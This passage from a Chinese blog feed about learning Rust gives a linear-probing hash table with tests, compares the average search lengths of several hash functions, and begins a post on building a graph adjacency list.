        <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">;</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">MyHash</span><span class="token punctuation">&#123;</span>
            data <span class="token punctuation">:</span> table<span class="token punctuation">,</span>
            len
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">hash_1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>
            total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hash of &#123;&#125; is &#123;&#125;"</span><span class="token punctuation">,</span> input<span class="token punctuation">,</span> total<span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        total <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 43，质数</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 哈希映射</span>
        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">hash_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> start <span class="token operator">=</span> index<span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> index<span class="token punctuation">;</span>
        <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            current <span class="token operator">=</span> <span class="token punctuation">(</span>current <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">;</span>
            <span class="token keyword">if</span> current <span class="token operator">==</span> start <span class="token punctuation">&#123;</span>
                <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token macro property">bail!</span><span class="token punctuation">(</span><span class="token string">"表已满！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span> <span class="token punctuation">,</span> key<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">,</span><span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">hash_1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> start <span class="token operator">=</span> index<span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> index<span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> length <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">loop</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> val <span class="token operator">==</span> key<span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            current <span class="token operator">=</span> <span class="token punctuation">(</span>current <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">;</span>
            length <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> current <span class="token operator">==</span> start <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>hash<span class="token punctuation">::</span></span><span class="token class-name">MyHash</span><span class="token punctuation">;</span>

    <span class="token comment">//#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> myHash <span class="token operator">=</span> <span class="token class-name">MyHash</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token string">"bac"</span><span class="token punctuation">,</span> <span class="token string">"caa"</span><span class="token punctuation">,</span> <span class="token string">"dee"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"renming"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            myHash<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token macro property">assert!</span><span class="token punctuation">(</span>myHash<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_find</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> table <span class="token operator">=</span> <span class="token class-name">MyHash</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> test_names <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
            <span class="token string">"rust"</span><span class="token punctuation">,</span><span class="token string">"cargo"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"cpp"</span><span class="token punctuation">,</span><span class="token string">"c_sharp"</span><span class="token punctuation">,</span><span class="token string">"python"</span><span class="token punctuation">,</span><span class="token string">"java"</span><span class="token punctuation">,</span><span class="token string">"ruby"</span><span class="token punctuation">,</span><span class="token string">"haskell"</span><span class="token punctuation">,</span><span class="token string">"elixir"</span><span class="token punctuation">,</span>
            <span class="token string">"kotlin"</span><span class="token punctuation">,</span><span class="token string">"lua"</span><span class="token punctuation">,</span><span class="token string">"javascript"</span><span class="token punctuation">,</span><span class="token string">"typescript"</span><span class="token punctuation">,</span><span class="token string">"jerryscript"</span><span class="token punctuation">,</span><span class="token string">"go"</span><span class="token punctuation">,</span><span class="token string">"maven"</span><span class="token punctuation">,</span><span class="token string">"docker"</span><span class="token punctuation">,</span><span class="token string">"k8s"</span><span class="token punctuation">,</span><span class="token string">"zig"</span><span class="token punctuation">,</span>
            <span class="token string">"Swift"</span><span class="token punctuation">,</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"asm"</span><span class="token punctuation">,</span><span class="token string">"auceptin"</span><span class="token punctuation">,</span><span class="token string">"tokio"</span><span class="token punctuation">,</span><span class="token string">"sqlx"</span><span class="token punctuation">,</span><span class="token string">"request"</span><span class="token punctuation">,</span><span class="token string">"tauri"</span><span class="token punctuation">,</span><span class="token string">"tracing"</span><span class="token punctuation">,</span><span class="token string">"anyhow"</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// 插入所有名字</span>
        <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token operator">&amp;</span>test_names <span class="token punctuation">&#123;</span>
            table<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> total_search_length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token operator">&amp;</span>test_names <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> <span class="token punctuation">(</span>found<span class="token punctuation">,</span> length<span class="token punctuation">)</span> <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token macro property">assert!</span><span class="token punctuation">(</span>found<span class="token punctuation">,</span> <span class="token string">"插入的名字应该能找到: &#123;&#125;"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>

            total_search_length <span class="token operator">+=</span> length<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">let</span> average <span class="token operator">=</span> total_search_length <span class="token keyword">as</span> <span class="token keyword">f64</span> <span class="token operator">/</span> test_names<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"平均查找长度：&#123;&#125;"</span><span class="token punctuation">,</span>average<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>average<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2f64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>现在的平均查找长度是：1.6666666666666667</p>
<p>再测试几个哈希函数：</p>
<ul>
<li>直接定址法： 2.933333333333333</li>
<li>平方取中法： 1.9666666666666666</li>
<li>乘余取整法： 3.4</li>
<li>折叠法 ：1.4333333333333333</li>
</ul>
<p>也跟这些办法的具体实现有关：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">hash_1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> method <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">match</span> method <span class="token punctuation">&#123;</span>
        <span class="token number">0</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 除留余数法</span>
            <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>
                total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hash of &#123;&#125; is &#123;&#125;"</span><span class="token punctuation">,</span> input<span class="token punctuation">,</span> total<span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
            total <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 43，质数</span>
        <span class="token punctuation">&#125;</span>
        <span class="token number">1</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
            <span class="token comment">// 直接定址法</span>
            <span class="token keyword">if</span> <span class="token operator">!</span>input<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 取ASCII加和为key</span>
                <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>
                    total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token comment">// 加上字符串长度作为偏移</span>
                total<span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token number">0</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token number">2</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
            <span class="token comment">// 平方取中法</span>
            <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token comment">// 将字符串转换为一个大数</span>
            <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                total <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">wrapping_mul</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>b <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token comment">// 平方</span>
            <span class="token keyword">let</span> square <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">wrapping_mul</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 取中间几位（取32位的中间16位）</span>
            <span class="token keyword">let</span> middle <span class="token operator">=</span> <span class="token punctuation">(</span>square <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>

            middle <span class="token keyword">as</span> <span class="token keyword">usize</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len
        <span class="token punctuation">&#125;</span>
        <span class="token number">3</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 乘余取整法</span>
            <span class="token keyword">let</span> a<span class="token punctuation">:</span> <span class="token keyword">f64</span> <span class="token operator">=</span> <span class="token number">0.6180339887</span><span class="token punctuation">;</span> <span class="token comment">// 黄金分割数</span>
            <span class="token keyword">let</span> <span class="token keyword">mut</span> k<span class="token punctuation">:</span> <span class="token keyword">f64</span> <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>

            <span class="token comment">// 将字符串转换为数值</span>
            <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                k <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">256.0</span> <span class="token operator">+</span> b <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token comment">// 取小数部分</span>
            <span class="token keyword">let</span> fractional <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1.0</span><span class="token punctuation">;</span>

            <span class="token comment">// 乘以表大小</span>
            <span class="token punctuation">(</span>fractional <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span>
        <span class="token punctuation">&#125;</span>
        _ <span class="token operator">=></span><span class="token punctuation">&#123;</span>
            <span class="token comment">// 折叠法</span>
            <span class="token keyword">let</span> chunk_size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// 每4个字符一组</span>
            <span class="token keyword">let</span> bytes <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> <span class="token keyword">mut</span> sum<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span> chunk <span class="token keyword">in</span> bytes<span class="token punctuation">.</span><span class="token function">chunks</span><span class="token punctuation">(</span>chunk_size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> chunk_value<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> chunk <span class="token punctuation">&#123;</span>
                    chunk_value <span class="token operator">=</span> <span class="token punctuation">(</span>chunk_value <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                sum <span class="token operator">=</span> sum<span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>chunk_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            sum <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>五和六逃了</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目：&quot; class=&quot;headerlink&quot; title=&quot;题目：&quot;&gt;&lt;/a&gt;题目：&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-text&quot; data-language=&quot;text&quot;&gt;&lt;code</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-图实验</title>
    <link href="https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-11-29T03:26:34.000Z</published>
    <updated>2025-11-29T03:49:13.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现一个邻接表"><a href="#实现一个邻接表" class="headerlink" title="实现一个邻接表"></a>实现一个邻接表</h2><p>基本结构，一个链表头结点vec代指每个顶点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span><span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">;</span>
<span class="token comment">//第一项表示起始节点索引，第二项表示指向节点索引</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">usize</span><span class="token punctuation">,</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Graph</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// 图是一个链表头结点向量</span>
    vertices<span class="token punctuation">:</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Head</span><span class="token operator">></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Head</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//头结点，同时记录出度</span>
    index<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    first<span class="token punctuation">:</span><span class="token class-name">Link</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[derive(Clone)]</span>
<span class="token comment">// 节点，依据索引排序，记录权重</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>
    weight <span class="token punctuation">:</span> <span class="token keyword">isize</span><span class="token punctuation">,</span>
    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    next <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">Graph</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span><span class="token class-name">Graph</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> vertices <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">with_capacity</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>size <span class="token punctuation">&#123;</span>
            vertices<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index <span class="token operator">=</span> i <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span> vertices <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

